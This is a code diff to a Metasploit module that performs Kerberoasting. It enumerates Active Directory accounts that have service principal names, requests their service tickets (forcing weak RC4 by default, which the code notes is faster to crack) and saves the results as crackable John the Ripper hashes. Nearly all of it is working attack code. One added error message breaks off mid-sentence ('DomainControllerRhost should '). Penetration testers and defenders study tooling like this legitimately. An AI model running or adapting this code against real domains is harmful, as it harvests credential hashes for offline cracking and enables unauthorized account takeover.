@@ -42,7 +42,7 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RHOSTS(nil, true, 'The target KDC, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html'),
         OptString.new('TARGET_USER', [ false, 'Specific user to kerberoast' ]),
-        OptBool.new('USE_RC4_HMAC', [ true, 'Request using RC4 hash instead of default encryption types (faster to crack)', true]),
+        OptBool.new('USE_RC4_HMAC', [ true, 'Forcibly request RC4 etype instead of letting the DC decide based on KrbOfferedEncryptionTypes (RC4_HMAC is faster to crack)', true]),
         OptString.new('Rhostname', [ false, "The domain controller's hostname"], aliases: ['LDAP::Rhostname']),
       ]
     )
@@ -58,6 +58,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
+    dc = datastore['DomainControllerRhost']
+    rhost = datastore['RHOST']
+    if dc != rhost
+      fail_with(Failure::BadConfig, 'DomainControllerRhost should ')
+    end
     if datastore['TARGET_USER'].nil?
       run_ldap
     else
@@ -65,19 +70,58 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
+  def run_user
+    user = datastore['TARGET_USER']
+    filter = "(&(objectClass=user)(sAMAccountName=#{Net::LDAP::Filter.escape(user)}))"
+    attributes = ['servicePrincipalName', 'sAMAccountName']
+    spn = nil
+    count = run_ldap_query(filter, attributes) do |result|
+      if result.respond_to?(:serviceprincipalname)
+        spn = result.serviceprincipalname[0]
+      end
+    end
+    if count == 0
+      fail_with(Failure::BadConfig, "User #{user} not found")
+    elsif spn.nil?
+      fail_with(Failure::BadConfig, "User #{user} has no SPN")
+    end
+    begin
+      jtr = roast(user, spn)
+      jtr_format = Metasploit::Framework::Hashes.identify_hash(jtr)
+      report_hash(jtr, jtr_format)
+      vprint_good("Success: \n#{jtr}")
+      unless datastore['VERBOSE']
+        print_good('To obtain the crackable values for this DC, run `creds`:')
+        print_good("creds -t #{jtr_format} -O #{datastore['RHOST']} -o <outfile.(jtr|hcat)>")
+      end
+    rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
+      print_error("#{user} reported as kerberoastable, but received error when attempting to retrieve TGS (#{e})")
+    end
+  end
+
   def run_ldap
-    results = []
+    jtr_formats = Set.new
+    hashes = []
     run_builtin_ldap_query('ENUM_USER_SPNS_KERBEROAST') do |result|
       spn = result.serviceprincipalname[0]
       username = result.samaccountname[0]
       begin
-        results.append(roast(username, spn))
+        jtr = roast(username, spn)
+        hashes.append(jtr)
+        jtr_format = Metasploit::Framework::Hashes.identify_hash(jtr)
+        jtr_formats.add(jtr_format)
+        report_hash(jtr, jtr_format)
       rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
         print_error("#{username} reported as kerberoastable, but received error when attempting to retrieve TGS (#{e})")
       end
     end
-    stored_path = store_loot('kerberoast.jtr', 'plain/text', rhost, results.join("\n"), 'kerberoast-jtr.txt', "Kerberoasting #{datastore['LDAPDomain']}")
-    print_status("Crack file stored at: #{stored_path}")
+    vprint_good("Success: \n#{hashes.join("\n")}")
+    unless datastore['VERBOSE']
+      print_good('To obtain the crackable values, run `creds`:')
+      jtr_formats.each do |format|
+        print_good("creds -t #{format} -O #{datastore['RHOST']} -o <outfile.(jtr|hcat)>")
+      end
+    end
   end
 
   def roast(roasted, spn)
@@ -120,6 +164,13 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     etypes = Set.new([credential.keyblock.enctype.value])
+    intersection = etypes.intersection(offered_etypes)
+    if intersection.empty?
+      names = etypes.map { |t| Rex::Proto::Kerberos::Crypto::Encryption.const_name(t).sub('_', '-') }.join(',')
+      print_warning("Unable to request ticket with configured etypes for #{roasted}. Supported: #{names}")
+      return nil
+    end
+
     tgs_options = {
       pa_data: []
     }
@@ -129,13 +180,40 @@ class MetasploitModule < Msf::Auxiliary
       ticket,
       domain_name.upcase,
       username,
-      etypes,
+      intersection,
       expiry_time,
       now,
       sname,
       tgs_options
     )
+
     format_tgs_rep_to_john_hash(tgs_ticket, roasted)
+  end
+
+  def report_hash(hash, jtr_format)
+    service_data = {
+      address: rhost,
+      port: rport,
+      service_name: 'Kerberos',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+    credential_data = {
+      module_fullname: fullname,
+      origin_type: :service,
+      private_data: hash,
+      private_type: :nonreplayable_hash,
+      jtr_format: jtr_format
+    }.merge(service_data)
+
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def offered_etypes
